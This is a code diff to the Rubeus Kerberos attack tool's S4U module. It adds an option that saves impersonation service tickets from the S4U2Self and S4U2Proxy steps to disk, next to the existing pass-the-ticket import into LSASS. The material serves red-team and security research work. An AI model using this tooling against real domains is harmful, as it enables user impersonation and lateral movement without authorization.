@@ -7,7 +7,7 @@ namespace Rubeus
 {
     public class S4U
     {
-        public static void Execute(string userName, string domain, string keyString, Interop.KERB_ETYPE etype, string targetUser, string targetSPN = "", bool ptt = false, string domainController = "", string altService = "", KRB_CRED tgs = null)
+        public static void Execute(string userName, string domain, string keyString, Interop.KERB_ETYPE etype, string targetUser, string targetSPN = "", string outfile = "", bool ptt = false, string domainController = "", string altService = "", KRB_CRED tgs = null)
         {
             // first retrieve a TGT for the user
             byte[] kirbiBytes = Ask.TGT(userName, domain, keyString, etype, null, false, domainController, new Interop.LUID());
@@ -26,27 +26,27 @@ namespace Rubeus
             KRB_CRED kirbi = new KRB_CRED(kirbiBytes);
 
             // execute the s4u process
-            Execute(kirbi, targetUser, targetSPN, ptt, domainController, altService, tgs);
+            Execute(kirbi, targetUser, targetSPN, outfile, ptt, domainController, altService, tgs);
         }
-        public static void Execute(KRB_CRED kirbi, string targetUser, string targetSPN = "", bool ptt = false, string domainController = "", string altService = "", KRB_CRED tgs = null)
+        public static void Execute(KRB_CRED kirbi, string targetUser, string targetSPN = "", string outfile = "", bool ptt = false, string domainController = "", string altService = "", KRB_CRED tgs = null)
         {
             Console.WriteLine("[*] Action: S4U\r\n");
 
             if (tgs != null && String.IsNullOrEmpty(targetSPN) == false)
             {
                 Console.WriteLine("[*] Loaded a TGS for {0}\\{1}", tgs.enc_part.ticket_info[0].prealm, tgs.enc_part.ticket_info[0].pname.name_string[0]);
-                S4U2Proxy(kirbi, targetUser, targetSPN, ptt, domainController, altService, tgs.tickets[0]);
+                S4U2Proxy(kirbi, targetUser, targetSPN, outfile, ptt, domainController, altService, tgs.tickets[0]);
             }
             else
             {
-                Ticket self = S4U2Self(kirbi, targetUser, targetSPN, ptt, domainController, altService);
+                Ticket self = S4U2Self(kirbi, targetUser, targetSPN, outfile, ptt, domainController, altService);
                 if (String.IsNullOrEmpty(targetSPN) == false)
                 {
-                    S4U2Proxy(kirbi, targetUser, targetSPN, ptt, domainController, altService, self);
+                    S4U2Proxy(kirbi, targetUser, targetSPN, outfile, ptt, domainController, altService, self);
                 }
             }
         }
-        private static void S4U2Proxy(KRB_CRED kirbi, string targetUser, string targetSPN, bool ptt, string domainController = "", string altService = "", Ticket tgs = null)
+        private static void S4U2Proxy(KRB_CRED kirbi, string targetUser, string targetSPN, string outfile, bool ptt, string domainController = "", string altService = "", Ticket tgs = null)
         {
             Console.WriteLine("[*] Impersonating user '{0}' to target SPN '{1}'", targetUser, targetSPN);
             if (!String.IsNullOrEmpty(altService))
@@ -196,6 +196,16 @@ namespace Rubeus
                         {
                             Console.WriteLine("      {0}", line);
                         }
+
+                        if (!String.IsNullOrEmpty(outfile))
+                        {
+                            string filename = $"{Helpers.GetBaseFromFilename(outfile)}_{altSname}-{serverName}{Helpers.GetExtensionFromFilename(outfile)}";
+                            if (Helpers.WriteBytesToFile(filename, kirbiBytes))
+                            {
+                                Console.WriteLine("\r\n[*] Ticket written to {0}\r\n", filename);
+                            }
+                        }
+
                         if (ptt)
                         {
                             // pass-the-ticket -> import into LSASS
@@ -267,6 +277,16 @@ namespace Rubeus
                     {
                         Console.WriteLine("      {0}", line);
                     }
+
+                    if (!String.IsNullOrEmpty(outfile))
+                    {
+                        string filename = $"{Helpers.GetBaseFromFilename(outfile)}_{targetSPN}{Helpers.GetExtensionFromFilename(outfile)}";
+                        if (Helpers.WriteBytesToFile(filename, kirbiBytes))
+                        {
+                            Console.WriteLine("\r\n[*] Ticket written to {0}\r\n", filename);
+                        }
+                    }
+
                     if (ptt)
                     {
                         // pass-the-ticket -> import into LSASS
@@ -285,7 +305,7 @@ namespace Rubeus
                 Console.WriteLine("\r\n[X] Unknown application tag: {0}", responseTag);
             }
         }
-        private static Ticket S4U2Self(KRB_CRED kirbi, string targetUser, string targetSPN, bool ptt, string domainController = "", string altService = "")
+        private static Ticket S4U2Self(KRB_CRED kirbi, string targetUser, string targetSPN, string outfile, bool ptt, string domainController = "", string altService = "")
         {
             // extract out the info needed for the TGS-REQ/S4U2Self execution
             string userName = kirbi.enc_part.ticket_info[0].pname.name_string[0];
@@ -384,6 +404,15 @@ namespace Rubeus
                     Console.WriteLine("      {0}", line);
                 }
                 Console.WriteLine("");
+
+                if (!String.IsNullOrEmpty(outfile))
+                {
+                    string filename = $"{Helpers.GetBaseFromFilename(outfile)}_{info.pname.name_string[0]}_to_{info.sname.name_string[0]}@{info.srealm}{Helpers.GetExtensionFromFilename(outfile)}";
+                    if (Helpers.WriteBytesToFile(filename, kirbiBytes))
+                    {
+                        Console.WriteLine("\r\n[*] Ticket written to {0}\r\n", filename);
+                    }
+                }
 
                 return rep.ticket;
             }
